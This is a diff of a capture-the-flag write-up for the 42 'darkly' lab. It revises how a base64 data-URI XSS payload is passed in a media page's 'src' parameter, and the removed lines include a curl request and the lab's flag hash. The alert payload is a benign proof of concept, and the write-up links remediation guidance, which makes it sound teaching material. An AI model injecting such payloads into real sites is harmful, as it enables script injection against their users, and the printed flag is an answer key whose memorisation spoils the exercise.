@@ -35,17 +35,13 @@ data:text/html,<script>alert('42 - The answer to life, the universe and everythi
 </details>
 
 
-By tring base64 encoded string for the `src` paramter, with [appropriate syntax](https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/Data_URLs#syntax), the following address will give the flag
-
+Passing the script encoded in `base64` and using appropriate syntax `data:[<mediatype>][;base64],<data>` gives the flag
+```sh
+┌──$ [~/42/2022/darkly]
+└─>  echo -n "<script>alert('42 - The answer to life, the universe and everything')</script>" | base64
+PHNjcmlwdD5hbGVydCgnNDIgLSBUaGUgYW5zd2VyIHRvIGxpZmUsIHRoZSB1bml2ZXJzZSBhbmQgZXZlcnl0aGluZycpPC9zY3JpcHQ+
 ```
-$ echo -n '<script>alert('hi');</script>' | base64
-PHNjcmlwdD5hbGVydChoaSk7PC9zY3JpcHQ+
-
-$ curl http://{IP_ADDR}/index.php?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgnaGknKTs8L3NjcmlwdD4\=
-[...]
-The flag is : 928d819fc19405ae09921a2b71227bd9aba106f9d2d37ac412e9e5a750f1506d
-[...]
-```
+<img width="1680" alt="image" src="https://user-images.githubusercontent.com/22397481/207858953-5b451dce-3444-407a-8dd4-f92fdb4ff12e.png">
 
 # Remediation
 - https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
